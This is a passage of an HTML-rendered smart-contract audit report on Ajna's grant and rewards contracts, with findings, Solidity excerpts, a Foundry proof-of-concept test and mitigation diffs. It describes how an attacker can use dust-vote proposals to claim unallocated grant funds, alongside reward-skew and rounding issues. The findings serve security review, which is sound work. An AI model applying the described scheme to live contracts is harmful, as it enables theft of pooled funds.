class=\"mtk12\">totalTokensRequested</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check each proposal in the slate is valid</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numProposalsInSlate_</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">Proposal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_standardFundingProposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalIds_</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// check if Proposal is in the topTenProposals list</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">_findProposalIndex</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalIds_</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">], </span><span class=\"mtk12\">_topTenProposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">distributionId_</span><span class=\"mtk1\">]) == -</span><span class=\"mtk7\">1</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidProposalSlate</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// account for fundingVotesReceived possibly being negative</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;          </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fundingVotesReceived</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidProposalSlate</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p>The only criteria for state update is greater sum of the funding votes:</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L316-L318\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L316-L318</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check if slate of proposals is better than the existing slate, and is thus the new top slate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">newTopSlate_</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">currentSlateHash</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> ||</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;          (</span><span class=\"mtk12\">currentSlateHash</span><span class=\"mtk1\">!= </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">sum</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk11\">_sumProposalFundingVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_fundedProposalSlates</span><span class=\"mtk1\">[</span><span class=\"mtk12\">currentSlateHash</span><span class=\"mtk1\">]));</span></span></span></code></pre>\n<p>I.e. when the activity is low enough attacker can always maximize the <code>totalTokensRequested</code> to be exactly <code>gbc * 9 / 10</code>, claiming the difference to itself (i.e. the dust vote supplied proposal is to transfer unallocated part to attacker’s account in this case):</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L445-L450\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L445-L450</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">totalTokensRequested</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokensRequested</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// check if slate of proposals exceeded budget constraint ( 90% of GBC )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;          </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">totalTokensRequested</span><span class=\"mtk1\"> &gt; (</span><span class=\"mtk12\">gbc</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">9</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">10</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidProposalSlate</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-11\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-11\" aria-label=\"recommended mitigation steps 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider introducing the minimum accepted vote power for any proposal to be included in the final slate, as an example:</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L421-L441\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L421-L441</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function _validateSlate(uint24 distributionId_, uint256 endBlock, uint256 distributionPeriodFundsAvailable_, uint256[] calldata proposalIds_, uint256 numProposalsInSlate_) internal view returns (uint256 sum_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       // using 0.1% of the total vote power used as a minimum for any winning proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       uint minFundingVotePower = _distributions[distributionId_].fundingVotePowerCast / 1000;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        // check each proposal in the slate is valid</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        for (uint i = 0; i &lt; numProposalsInSlate_; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            Proposal memory proposal = _standardFundingProposals[proposalIds_[i]];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            // check if Proposal is in the topTenProposals list</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            if (_findProposalIndex(proposalIds_[i], _topTenProposals[distributionId_]) == -1) revert InvalidProposalSlate();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            // account for fundingVotesReceived possibly being negative</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-           if (proposal.fundingVotesReceived &lt; 0) revert InvalidProposalSlate();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+           if (proposal.fundingVotesReceived &lt; 0 || Maths.wpow(SafeCast.toUint256(Maths.abs(proposal.fundingVotesReceived)), 2) &lt; minFundingVotePower) revert InvalidProposalSlate();</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/465#issuecomment-1554800129\">ith-harvey (Ajna) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-02-delegate-rewards-system-is-unfair-to-delegates-with-less-tokens-and-reduces-decentralization\" style=\"position:relative;\"><a href=\"#m-02-delegate-rewards-system-is-unfair-to-delegates-with-less-tokens-and-reduces-decentralization\" aria-label=\"m 02 delegate rewards system is unfair to delegates with less tokens and reduces decentralization permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/413\">[M-02] Delegate rewards system is unfair to delegates with less tokens and reduces decentralization</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/413\">0x73696d616f</a>, also found by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/131\">0xRobocop</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L286\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L286</a><br>\n<a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L541\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L541</a><br>\n<a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L673\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L673</a><br>\n<a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L891\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L891</a></p>\n<p>Reduces decentralization significantly and discourages delegates with less token power to vote.</p>\n<h3 id=\"proof-of-concept-11\" style=\"position:relative;\"><a href=\"#proof-of-concept-11\" aria-label=\"proof of concept 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The current math gives delegates rewards based on the square of their votes. Thus, accounts with higher number of votes will be rewarded a bigger number of rewards, leading to less decentralization.</p>\n<p>Add the following test to <code>StandardFunding.t.sol</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function test_POC_WhaleCanStealMostDelegateRewards() external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // 24 tokenholders self delegate their tokens to enable voting on the proposals</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _selfDelegateVoters(_token, _votersArr);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    changePrank(_tokenDeployer);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _token.transfer(_tokenHolder1, 300_000_000 * 1e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.roll(_startBlock + 150);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // start distribution period</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _startDistributionPeriod(_grantFund);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint24 distributionId = _grantFund.getDistributionId();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    (, , , uint128 gbc, , ) = _grantFund.getDistributionPeriodInfo(distributionId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    assertEq(gbc, 15_000_000 * 1e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    TestProposalParams[] memory testProposalParams = new TestProposalParams[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    testProposalParams[0] = TestProposalParams(_tokenHolder1, 8_500_000 * 1e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // create 7 proposals paying out tokens</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    TestProposal[] memory testProposals = _createNProposals(_grantFund, _token, testProposalParams);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    assertEq(testProposals.length, 1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.roll(_startBlock + 200);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // screening period votes</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _screeningVote(_grantFund, _tokenHolder1, testProposals[0].proposalId, _getScreeningVotes(_grantFund, _tokenHolder1));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _screeningVote(_grantFund, _tokenHolder2, testProposals[0].proposalId, _getScreeningVotes(_grantFund, _tokenHolder2));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /*********************/</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /*** Funding Stage ***/</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /*********************/</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // skip time to move from screening period to funding period</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.roll(_startBlock + 600_000);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // check topTenProposals array is correct after screening period - only six should have advanced</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    GrantFund.Proposal[] memory screenedProposals = _getProposalListFromProposalIds(_grantFund, _grantFund.getTopTenProposals(distributionId));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // funding period votes for two competing slates, 1, or 2 and 3</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _fundingVote(_grantFund, _tokenHolder1, screenedProposals[0].proposalId, voteYes, 350_000_000 * 1e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _fundingVote(_grantFund, _tokenHolder2, screenedProposals[0].proposalId, voteYes, 50_000_000 * 1e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /************************/</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /*** Challenge Period ***/</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /************************/</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256[] memory potentialProposalSlate = new uint256[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    potentialProposalSlate[0] = screenedProposals[0].proposalId;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // skip to the end of the DistributionPeriod</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.roll(_startBlock + 650_000);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.expectEmit(true, true, false, true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    emit FundedSlateUpdated(distributionId, _grantFund.getSlateHash(potentialProposalSlate));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bool proposalSlateUpdated = _grantFund.updateSlate(potentialProposalSlate, distributionId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    assertTrue(proposalSlateUpdated);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /********************************/</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /*** Execute Funded Proposals ***/</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /********************************/</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // skip to the end of the Distribution&#39;s challenge period</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.roll(_startBlock + 700_000);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // execute funded proposals</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _executeProposal(_grantFund, _token, testProposals[0]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /******************************/</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /*** Claim Delegate Rewards ***/</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /******************************/</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    assertEq(_grantFund.getDelegateReward(distributionId, _tokenHolder1) / 1e18, 1_470_000);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    assertEq(_grantFund.getDelegateReward(distributionId, _tokenHolder2) / 1e18, 30_000);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // _tokenHolder1 reward is approx 1_470_000/(1_470_000 + 30_000) ~ 98%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // linear distribution</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // _tokenHolder1 reward is approx 350/(350 + 50) = 87.5%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>In this test, <code>_tokenHolder1</code> has 350/50 = 7 times more tokens and leads to getting 98% of the rewards.<br>\nHad a linear distribution been used, <code>_tokenHolder1</code> would have received 87.5%, a fairer number.</p>\n<p>In fact, it’s even better to use a quadratic voting system, being the rewards the square root of the votes. This would incentivize more delegates and increase decentralization.</p>\n<h3 id=\"tools-used-7\" style=\"position:relative;\"><a href=\"#tools-used-7\" aria-label=\"tools used 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Vscode, Foundry</p>\n<h3 id=\"recommended-mitigation-steps-12\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-12\" aria-label=\"recommended mitigation steps 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Use a linear or <a href=\"https://axelar.network/blog/quadratic-voting-DAOs-dPoS-and-decentralization\">quadratic</a> delegate reward system.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/413#issuecomment-1555153408\">MikeHathaway (Ajna) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/413#issuecomment-1569119241\">Picodes (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Note: validating the finding assuming it is a bug and distributing rewards according to the square wasn’t the intent of the dev team. Otherwise, the fact that the warden finds it “unfair” isn’t really a security issue.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-03-_updatebucketexchangerateandcalculaterewards-reward-calculation-accuracy-loss\" style=\"position:relative;\"><a href=\"#m-03-_updatebucketexchangerateandcalculaterewards-reward-calculation-accuracy-loss\" aria-label=\"m 03 _updatebucketexchangerateandcalculaterewards reward calculation accuracy loss permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/394\">[M-03] <code>_updateBucketExchangeRateAndCalculateRewards</code> reward calculation accuracy loss</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/394\">kutugu</a></em></p>\n<p>Divide first and then multiply, which has precision loss. The loss depends on the denominator, which is at most <code>denominator - 1</code>.<br>\nAlthough <code>Maths.wdiv rounded</code> adopted in _updateBucketExchangeRateAndCalculateRewards, reduce the loss, but theoretically <code>interestFactor</code> loss is about <code>interestEarned_ / 2</code>.<br>\nThis means that the more interest are earned, the more users lose.</p>\n<h3 id=\"proof-of-concept-12\" style=\"position:relative;\"><a href=\"#proof-of-concept-12\" aria-label=\"proof of concept 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Modify for testing</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/ajna-core/src/RewardsManager.sol b/ajna-core/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 314b476..421940f 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/ajna-core/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/ajna-core/src/RewardsManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -801,8 +801,12 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 rewards_ += Maths.wmul(UPDATE_CLAIM_REWARD, Maths.wmul(burnFactor, interestFactor));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 